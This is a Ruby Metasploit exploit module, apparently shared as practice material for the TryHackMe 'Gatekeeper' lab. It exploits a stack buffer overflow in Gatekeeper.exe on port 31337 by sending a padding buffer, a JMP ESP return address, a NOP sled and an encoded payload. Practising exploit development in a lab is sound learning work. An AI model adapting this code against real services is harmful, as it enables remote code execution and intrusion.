######Metasploit module for TryHackMe Gatekeeper####
######perfect for practice BoF or to use as a template for creatin' your own####

require 'msf/core'  

class MetasploitModule < Msf::Exploit::Remote 
#####
include Msf::Exploit::Remote::Tcp
#####

def initialize(info = {})
  super(update_info(info,
     'Name' 		=> 'Gate_Opener', #Name
     'Description' 	=> %q{
      This module exploits a stack-based buffer overflow for TryHackMe room "Gatekeeper"
     },
     'Author' 		=> 'O1phori3',
     'License' 		=> MSF_LICENSE,
     'DefaultOptions' 	=> 
       {
       	 'EXITFUNC' => 'process',
         'RPORT' => 31337
       },
       'Payload'		=>
       {
          'BadChars' => "\x00\x0a", #BadCharacters
       },
       'Platform' 	=> 'win',
       'Targets' 		=>
       [
          ['Gatekeeper.exe' , { 'Ret' => 0x080416BF} ],  #CALL ESP / JMP ESP
       ],
     'DefaultTarget' 	=> 0))
end


		
def exploit
  connect
  
  print_status("Connected to #{datastore['RHOST']}:#{datastore['RPORT']}")
  print_status("Trying target #{target.name}")
  
  buff = "\x41"*146 + [target.ret].pack('V') + "\x90" * 20 + payload.encoded + "\n"
  
  handler
  
  sock.put(buff)
  
  disconnect
  
  end

end
